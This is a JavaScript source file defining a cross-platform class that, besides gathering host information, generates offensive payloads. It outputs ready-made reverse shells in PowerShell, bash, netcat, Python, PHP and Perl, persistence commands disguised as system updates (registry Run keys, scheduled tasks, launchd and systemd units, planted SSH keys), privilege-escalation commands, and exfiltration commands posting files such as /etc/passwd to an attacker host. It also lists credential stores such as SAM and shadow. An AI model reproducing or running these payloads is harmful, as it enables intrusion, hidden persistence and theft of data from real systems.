import os from 'os';
import path from 'path';
import { exec, spawn } from 'child_process';
import { promisify } from 'util';
import fs from 'fs/promises';

const execAsync = promisify(exec);

export class CrossPlatformManager {
  constructor() {
    this.platform = os.platform();
    this.arch = os.arch();
    this.osType = os.type();
    this.release = os.release();
    this.homeDir = os.homedir();
    this.tempDir = os.tmpdir();
    
    this.platformCapabilities = this.initializePlatformCapabilities();
    this.commandMap = this.initializeCommandMap();
    this.pathSeparator = path.sep;
    this.isWindows = this.platform === 'win32';
    this.isMacOS = this.platform === 'darwin';
    this.isLinux = this.platform === 'linux';
    this.isUnix = this.isLinux || this.isMacOS;
  }

  initializePlatformCapabilities() {
    return {
      'win32': {
        name: 'Windows',
        shell: 'powershell.exe',
        shellFlags: ['-NoProfile', '-Command'],
        pathSeparator: '\\',
        executableExtension: '.exe',
        scriptExtension: '.ps1',
        adminCommand: 'runas',
        packageManager: 'choco',
        systemPaths: [
          'C:\\Windows\\System32',
          'C:\\Windows\\SysWOW64',
          'C:\\Program Files',
          'C:\\Program Files (x86)'
        ],
        sensitiveFiles: [
          'C:\\Windows\\System32\\config\\SAM',
          'C:\\Windows\\System32\\config\\SYSTEM',
          'C:\\Windows\\System32\\config\\SECURITY',
          'C:\\Users\\%USERNAME%\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat'
        ],
        exploitPaths: [
          '%TEMP%',
          '%APPDATA%',
          '%LOCALAPPDATA%',
          'C:\\Windows\\Temp',
          'C:\\Temp'
        ],
        persistenceMethods: [
          'registry-run',
          'scheduled-task',
          'service',
          'startup-folder',
          'wmi-event'
        ]
      },
      'darwin': {
        name: 'macOS',
        shell: '/bin/zsh',
        shellFlags: ['-c'],
        pathSeparator: '/',
        executableExtension: '',
        scriptExtension: '.sh',
        adminCommand: 'sudo',
        packageManager: 'brew',
        systemPaths: [
          '/System/Library',
          '/Library',
          '/Applications',
          '/usr/bin',
          '/usr/local/bin'
        ],
        sensitiveFiles: [
          '/etc/passwd',
          '/etc/shadow',
          '/etc/master.passwd',
          '/Library/Keychains/System.keychain',
          '/Users/*/Library/Keychains/login.keychain-db'
        ],
        exploitPaths: [
          '/tmp',
          '/var/tmp',
          '/Users/Shared',
          '~/Downloads',
          '~/Library/Caches'
        ],
        persistenceMethods: [
          'launchd-agent',
          'launchd-daemon',
          'login-item',
          'cron-job',
          'profile-script'
        ]
      },
      'linux': {
        name: 'Linux',
        shell: '/bin/bash',
        shellFlags: ['-c'],
        pathSeparator: '/',
        executableExtension: '',
        scriptExtension: '.sh',
        adminCommand: 'sudo',
        packageManager: this.detectLinuxPackageManager(),
        systemPaths: [
          '/bin',
          '/usr/bin',
          '/usr/local/bin',
          '/sbin',
          '/usr/sbin',
          '/opt'
        ],
        sensitiveFiles: [
          '/etc/passwd',
          '/etc/shadow',
          '/etc/sudoers',
          '/root/.ssh/authorized_keys',
          '/home/*/.ssh/authorized_keys'
        ],
        exploitPaths: [
          '/tmp',
          '/var/tmp',
          '/dev/shm',
          '/home/*/Downloads',
          '/var/www/html'
        ],
        persistenceMethods: [
          'cron-job',
          'systemd-service',
          'bashrc-profile',
          'ssh-key',
          'init-script'
        ]
      }
    };
  }

  initializeCommandMap() {
    return {
      'network': {
        'win32': {
          'ping': 'ping -n 4',
          'netstat': 'netstat -an',
          'ipconfig': 'ipconfig /all',
          'nslookup': 'nslookup',
          'arp': 'arp -a',
          'route': 'route print',
          'netsh': 'netsh interface show interface'
        },
        'darwin': {
          'ping': 'ping -c 4',
          'netstat': 'netstat -an',
          'ifconfig': 'ifconfig -a',
          'nslookup': 'nslookup',
          'arp': 'arp -a',
          'route': 'route -n get default',
          'networksetup': 'networksetup -listallhardwareports'
        },
        'linux': {
          'ping': 'ping -c 4',
          'netstat': 'netstat -an',
          'ifconfig': 'ip addr show',
          'nslookup': 'nslookup',
          'arp': 'arp -a',
          'route': 'ip route show',
          'ss': 'ss -tuln'
        }
      },
      'system': {
        'win32': {
          'whoami': 'whoami',
          'hostname': 'hostname',
          'systeminfo': 'systeminfo',
          'tasklist': 'tasklist',
          'services': 'sc query',
          'processes': 'wmic process list',
          'users': 'net user',
          'groups': 'net localgroup'
        },
        'darwin': {
          'whoami': 'whoami',
          'hostname': 'hostname',
          'uname': 'uname -a',
          'ps': 'ps aux',
          'launchctl': 'launchctl list',
          'users': 'dscl . list /Users',
          'groups': 'dscl . list /Groups',
          'system_profiler': 'system_profiler SPSoftwareDataType'
        },
        'linux': {
          'whoami': 'whoami',
          'hostname': 'hostname',
          'uname': 'uname -a',
          'ps': 'ps aux',
          'systemctl': 'systemctl list-units',
          'users': 'cat /etc/passwd',
          'groups': 'cat /etc/group',
          'lsb_release': 'lsb_release -a'
        }
      },
      'file': {
        'win32': {
          'dir': 'dir',
          'type': 'type',
          'copy': 'copy',
          'move': 'move',
          'del': 'del',
          'md': 'md',
          'rd': 'rd',
          'attrib': 'attrib'
        },
        'darwin': {
          'ls': 'ls -la',
          'cat': 'cat',
          'cp': 'cp',
          'mv': 'mv',
          'rm': 'rm',
          'mkdir': 'mkdir',
          'rmdir': 'rmdir',
          'chmod': 'chmod'
        },
        'linux': {
          'ls': 'ls -la',
          'cat': 'cat',
          'cp': 'cp',
          'mv': 'mv',
          'rm': 'rm',
          'mkdir': 'mkdir',
          'rmdir': 'rmdir',
          'chmod': 'chmod'
        }
      }
    };
  }

  detectLinuxPackageManager() {
    // Try to detect the package manager based on common distros
    try {
      if (fs.existsSync('/etc/debian_version')) return 'apt';
      if (fs.existsSync('/etc/redhat-release')) return 'yum';
      if (fs.existsSync('/etc/arch-release')) return 'pacman';
      if (fs.existsSync('/etc/alpine-release')) return 'apk';
      if (fs.existsSync('/etc/gentoo-release')) return 'emerge';
      return 'unknown';
    } catch {
      return 'unknown';
    }
  }

  getCurrentPlatformInfo() {
    return {
      platform: this.platform,
      architecture: this.arch,
      osType: this.osType,
      release: this.release,
      isWindows: this.isWindows,
      isMacOS: this.isMacOS,
      isLinux: this.isLinux,
      isUnix: this.isUnix,
      capabilities: this.platformCapabilities[this.platform],
      homeDirectory: this.homeDir,
      tempDirectory: this.tempDir,
      pathSeparator: this.pathSeparator
    };
  }

  async executeCommand(command, options = {}) {
    const platformInfo = this.platformCapabilities[this.platform];
    
    try {
      let fullCommand;
      
      if (this.isWindows) {
        // Use PowerShell for Windows commands
        fullCommand = `${platformInfo.shell} ${platformInfo.shellFlags.join(' ')} "${command}"`;
      } else {
        // Use appropriate shell for Unix-like systems
        fullCommand = command;
      }

      const result = await execAsync(fullCommand, {
        timeout: options.timeout || 30000,
        maxBuffer: options.maxBuffer || 1024 * 1024, // 1MB
        cwd: options.cwd || process.cwd(),
        env: { ...process.env, ...options.env }
      });

      return {
        success: true,
        stdout: result.stdout,
        stderr: result.stderr,
        platform: this.platform
      };
    } catch (error) {
      return {
        success: false,
        error: error.message,
        code: error.code,
        platform: this.platform
      };
    }
  }

  getNetworkCommand(commandType) {
    return this.commandMap.network[this.platform]?.[commandType] || null;
  }

  getSystemCommand(commandType) {
    return this.commandMap.system[this.platform]?.[commandType] || null;
  }

  getFileCommand(commandType) {
    return this.commandMap.file[this.platform]?.[commandType] || null;
  }

  async getSystemInformation() {
    const systemInfo = {
      platform: this.platform,
      architecture: this.arch,
      hostname: '',
      username: '',
      osVersion: '',
      networkInterfaces: [],
      runningProcesses: [],
      installedServices: [],
      userAccounts: [],
      systemCapabilities: this.platformCapabilities[this.platform]
    };

    try {
      // Get hostname
      const hostnameCmd = this.getSystemCommand('hostname');
      if (hostnameCmd) {
        const hostnameResult = await this.executeCommand(hostnameCmd);
        if (hostnameResult.success) {
          systemInfo.hostname = hostnameResult.stdout.trim();
        }
      }

      // Get username
      const whoamiCmd = this.getSystemCommand('whoami');
      if (whoamiCmd) {
        const whoamiResult = await this.executeCommand(whoamiCmd);
        if (whoamiResult.success) {
          systemInfo.username = whoamiResult.stdout.trim();
        }
      }

      // Get OS version (platform-specific)
      if (this.isWindows) {
        const systemInfoResult = await this.executeCommand('systeminfo');
        if (systemInfoResult.success) {
          systemInfo.osVersion = this.parseWindowsSystemInfo(systemInfoResult.stdout);
        }
      } else if (this.isMacOS) {
        const unameResult = await this.executeCommand('sw_vers');
        if (unameResult.success) {
          systemInfo.osVersion = unameResult.stdout.trim();
        }
      } else if (this.isLinux) {
        const unameResult = await this.executeCommand('uname -a');
        if (unameResult.success) {
          systemInfo.osVersion = unameResult.stdout.trim();
        }
      }

      // Get network interfaces
      const networkCmd = this.isWindows ? 'ipconfig /all' : 
                        this.isMacOS ? 'ifconfig -a' : 'ip addr show';
      const networkResult = await this.executeCommand(networkCmd);
      if (networkResult.success) {
        systemInfo.networkInterfaces = this.parseNetworkInterfaces(networkResult.stdout);
      }

    } catch (error) {
      console.error('Error gathering system information:', error);
    }

    return systemInfo;
  }

  parseWindowsSystemInfo(output) {
    const lines = output.split('\n');
    const osLine = lines.find(line => line.includes('OS Name:'));
    const versionLine = lines.find(line => line.includes('OS Version:'));
    
    if (osLine && versionLine) {
      return `${osLine.split(':')[1].trim()} ${versionLine.split(':')[1].trim()}`;
    }
    return 'Windows (version unknown)';
  }

  parseNetworkInterfaces(output) {
    const interfaces = [];
    
    if (this.isWindows) {
      // Parse Windows ipconfig output
      const blocks = output.split('\n\n');
      blocks.forEach(block => {
        if (block.includes('IPv4 Address') || block.includes('IP Address')) {
          const lines = block.split('\n');
          const nameMatch = lines[0].match(/(.+?):/);
          const ipMatch = block.match(/IPv4 Address[.\s]*:\s*(.+)/);
          
          if (nameMatch && ipMatch) {
            interfaces.push({
              name: nameMatch[1].trim(),
              ip: ipMatch[1].trim(),
              platform: 'windows'
            });
          }
        }
      });
    } else {
      // Parse Unix-like ifconfig/ip output
      const lines = output.split('\n');
      let currentInterface = null;
      
      lines.forEach(line => {
        if (line.match(/^[a-zA-Z0-9]+:/)) {
          currentInterface = line.split(':')[0];
        } else if (currentInterface && line.includes('inet ')) {
          const ipMatch = line.match(/inet\s+([0-9.]+)/);
          if (ipMatch) {
            interfaces.push({
              name: currentInterface,
              ip: ipMatch[1],
              platform: this.platform
            });
          }
        }
      });
    }
    
    return interfaces;
  }

  async createPlatformSpecificPayload(payloadType, options = {}) {
    const platformInfo = this.platformCapabilities[this.platform];
    const payloads = {
      reverse_shell: this.generateReverseShellPayload(options),
      persistence: this.generatePersistencePayload(options),
      privilege_escalation: this.generatePrivEscPayload(options),
      data_exfiltration: this.generateDataExfilPayload(options)
    };

    return payloads[payloadType] || null;
  }

  generateReverseShellPayload(options = {}) {
    const ip = options.ip || '127.0.0.1';
    const port = options.port || 4444;

    if (this.isWindows) {
      return {
        powershell: `powershell -c "$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
        cmd: `powershell -EncodedCommand <base64_encoded_payload>`,
        mshta: `mshta "javascript:a=GetObject('script:http://${ip}/payload.sct').Exec();close()"`
      };
    } else {
      return {
        bash: `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
        nc: `nc -e /bin/sh ${ip} ${port}`,
        python: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`,
        php: `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`,
        perl: `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`
      };
    }
  }

  generatePersistencePayload(options = {}) {
    const command = options.command || 'calc.exe';
    const platformInfo = this.platformCapabilities[this.platform];

    const persistenceMethods = {};

    if (this.isWindows) {
      persistenceMethods['registry_run'] = `reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "UpdateCheck" /d "${command}" /f`;
      persistenceMethods['scheduled_task'] = `schtasks /create /tn "SystemUpdate" /tr "${command}" /sc onlogon /f`;
      persistenceMethods['service'] = `sc create "WindowsUpdateService" binpath= "${command}" start= auto`;
      persistenceMethods['startup_folder'] = `copy "${command}" "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"`;
    } else if (this.isMacOS) {
      persistenceMethods['launchd_agent'] = this.generateLaunchdPlist(command, 'agent');
      persistenceMethods['launchd_daemon'] = this.generateLaunchdPlist(command, 'daemon');
      persistenceMethods['cron_job'] = `(crontab -l 2>/dev/null; echo "@reboot ${command}") | crontab -`;
      persistenceMethods['profile_script'] = `echo "${command}" >> ~/.bash_profile`;
    } else if (this.isLinux) {
      persistenceMethods['cron_job'] = `(crontab -l 2>/dev/null; echo "@reboot ${command}") | crontab -`;
      persistenceMethods['systemd_service'] = this.generateSystemdService(command);
      persistenceMethods['bashrc'] = `echo "${command}" >> ~/.bashrc`;
      persistenceMethods['ssh_key'] = `echo "ssh-rsa AAAAB3... attacker@host" >> ~/.ssh/authorized_keys`;
    }

    return persistenceMethods;
  }

  generateLaunchdPlist(command, type) {
    const label = `com.system.update.${Date.now()}`;
    const plistDir = type === 'agent' ? '~/Library/LaunchAgents' : '/Library/LaunchDaemons';
    
    return {
      plist_content: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>${label}</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>-c</string>
        <string>${command}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>`,
      install_command: `echo '${this.plist_content}' > ${plistDir}/${label}.plist && launchctl load ${plistDir}/${label}.plist`
    };
  }

  generateSystemdService(command) {
    const serviceName = `system-update-${Date.now()}`;
    
    return {
      service_content: `[Unit]
Description=System Update Service
After=network.target

[Service]
ExecStart=${command}
Restart=always
User=root

[Install]
WantedBy=multi-user.target`,
      install_command: `echo '${this.service_content}' > /etc/systemd/system/${serviceName}.service && systemctl enable ${serviceName} && systemctl start ${serviceName}`
    };
  }

  generatePrivEscPayload(options = {}) {
    const privescMethods = {};

    if (this.isWindows) {
      privescMethods['uac_bypass'] = `powershell -c "Start-Process powershell -Verb RunAs -ArgumentList '-Command & {${options.command || 'whoami'}}'}"`;
      privescMethods['token_impersonation'] = `powershell -c "Invoke-TokenManipulation -CreateProcess cmd.exe"`;
      privescMethods['service_abuse'] = `sc config "vulnerable_service" binpath= "cmd.exe /c ${options.command || 'net user hacker password /add'}"`;
    } else {
      privescMethods['sudo_abuse'] = `sudo ${options.command || '/bin/bash'}`;
      privescMethods['suid_abuse'] = `find / -perm -4000 2>/dev/null | grep -E "(vim|nano|find|python|perl)"`;
      privescMethods['kernel_exploit'] = `uname -a | grep -E "(2.6.32|3.13.0|4.4.0)"`;
      privescMethods['cron_abuse'] = `cat /etc/crontab && ls -la /etc/cron.d/`;
    }

    return privescMethods;
  }

  generateDataExfilPayload(options = {}) {
    const exfilMethods = {};
    const target = options.target || 'http://attacker.com/exfil';

    if (this.isWindows) {
      exfilMethods['powershell'] = `powershell -c "Invoke-WebRequest -Uri '${target}' -Method POST -Body (Get-Content '${options.file || 'C:\\sensitive.txt'}' | Out-String)"`;
      exfilMethods['curl'] = `curl -X POST -d @"${options.file || 'C:\\sensitive.txt'}" ${target}`;
      exfilMethods['certutil'] = `certutil -urlcache -split -f ${target} && certutil -encode "${options.file || 'C:\\sensitive.txt'}" encoded.txt`;
    } else {
      exfilMethods['curl'] = `curl -X POST -d @"${options.file || '/etc/passwd'}" ${target}`;
      exfilMethods['wget'] = `wget --post-file="${options.file || '/etc/passwd'}" ${target}`;
      exfilMethods['nc'] = `nc ${options.ip || '127.0.0.1'} ${options.port || '8080'} < "${options.file || '/etc/passwd'}"`;
      exfilMethods['base64'] = `cat "${options.file || '/etc/passwd'}" | base64 | curl -X POST -d @- ${target}`;
    }

    return exfilMethods;
  }

  async detectRunningServices() {
    let command;
    
    if (this.isWindows) {
      command = 'sc query state= all';
    } else if (this.isMacOS) {
      command = 'launchctl list';
    } else {
      command = 'systemctl list-units --type=service --state=running';
    }

    const result = await this.executeCommand(command);
    if (result.success) {
      return this.parseServiceList(result.stdout);
    }
    return [];
  }

  parseServiceList(output) {
    const services = [];
    
    if (this.isWindows) {
      const lines = output.split('\n');
      lines.forEach(line => {
        if (line.includes('SERVICE_NAME:')) {
          const serviceName = line.split(':')[1]?.trim();
          if (serviceName) {
            services.push({ name: serviceName, platform: 'windows' });
          }
        }
      });
    } else {
      const lines = output.split('\n');
      lines.forEach(line => {
        const match = line.match(/^[\s]*(\d+|-)\s+(\S+)/);
        if (match && match[2]) {
          services.push({ name: match[2], platform: this.platform });
        }
      });
    }
    
    return services;
  }

  async isElevated() {
    try {
      if (this.isWindows) {
        const result = await this.executeCommand('net session');
        return result.success;
      } else {
        const result = await this.executeCommand('id -u');
        return result.success && result.stdout.trim() === '0';
      }
    } catch {
      return false;
    }
  }

  getDefaultShellPayloads() {
    if (this.isWindows) {
      return {
        cmd: 'cmd.exe',
        powershell: 'powershell.exe',
        wsl: 'wsl.exe'
      };
    } else {
      return {
        bash: '/bin/bash',
        sh: '/bin/sh',
        zsh: '/bin/zsh',
        fish: '/usr/bin/fish'
      };
    }
  }
}